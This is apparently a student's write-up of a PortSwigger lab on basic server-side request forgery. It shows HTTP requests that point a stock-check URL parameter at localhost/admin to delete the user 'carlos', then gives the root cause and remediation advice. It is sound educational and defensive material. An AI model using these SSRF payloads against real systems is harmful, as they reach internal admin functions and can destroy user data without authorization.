# PortSwigger Lab: Basic SSRF against the local server

# TAGS: SSRF, Server-Side Request Forgery, Burp Suite

Category: SSRF
Date: November 3, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
Published: Ready
Status: Done

---

## Intro

This is the first lab in the SSRF series. SSRF, or Server-Side Request Forgery, happens when an application fetches a URL that I can control. The server thinks it is talking to one of its own internal services, but in reality it is following the URL that I gave it. In this lab the stock check feature does exactly that, so I just pointed it at the admin panel.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the stock check feature fetches data from an internal system, and the goal is to change the URL so the server requests the admin interface and then deletes the user `carlos`.

I opened a product page and clicked the "Check stock" button. The browser sent this request:

```http
POST /product/stock HTTP/2
Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```

The `stockApi` parameter is the interesting part. It is a full URL, and the server uses it to check the stock. If the server simply loads whatever URL I put there, then I can make it request anything that is reachable from its network.

---

## Exploitation:

#### Step 1: Point the stock check at the admin panel

I sent the request to Repeater and changed `stockApi` to the admin panel on localhost:

```http
POST /product/stock HTTP/2
Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

The response was a redirect, and it showed the admin interface. There I could see the links an administrator uses to delete users, including this one:

```text
/admin/delete?username=carlos
```

If I had tried to open that link normally in the browser, the application would have blocked me. But the server itself can reach it.

#### Step 2: Delete carlos through the SSRF

I went back to Repeater and changed `stockApi` once more, this time to the delete URL:

```http
POST /product/stock HTTP/2
Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

The server fetched that URL from localhost, which counted as an authenticated admin request. The user `carlos` was deleted and the lab was solved.

---

## Root Cause

The `stockApi` parameter is a URL that the server fetches without checking where it points. Because the request comes from the server itself, it reaches the admin panel as if it were a local administrator. The admin panel trusts requests that come from localhost, so the SSRF turns into an authentication bypass.

---

## Impact

An attacker can make the server reach internal services that are not exposed to the internet, like the admin panel, databases and cloud metadata endpoints. In this lab that was enough to delete a user. In a real application the same flaw can expose internal APIs, steal data or even lead to remote code execution on internal systems.

---

## Remediation

To prevent this issue, applications should:

- Validate and allow-list the URLs the server is allowed to fetch.
- Block requests to localhost, private IP ranges and cloud metadata endpoints.
- Enforce authentication on every endpoint, including the admin panel, instead of trusting that a request came from localhost.
- Use a fixed, server-side configuration for internal endpoints instead of accepting a URL from the client.

---

## Key Takeaways

1. Any parameter that holds a URL is a candidate for SSRF.
2. localhost is the first thing to try, because internal services often trust it.
3. The response can leak internal pages, including admin functionality.
4. A single SSRF request can perform actions, not just read data.

---

## References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger — Basic SSRF against the local server (lab)](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
